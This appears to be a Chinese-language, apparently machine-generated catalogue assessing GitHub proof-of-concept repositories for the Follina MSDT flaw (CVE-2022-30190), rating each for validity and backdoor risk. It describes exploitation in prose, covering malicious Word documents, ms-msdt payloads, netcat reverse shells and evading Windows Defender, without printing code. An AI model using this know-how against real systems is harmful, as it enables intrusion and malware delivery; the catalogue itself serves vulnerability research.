**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

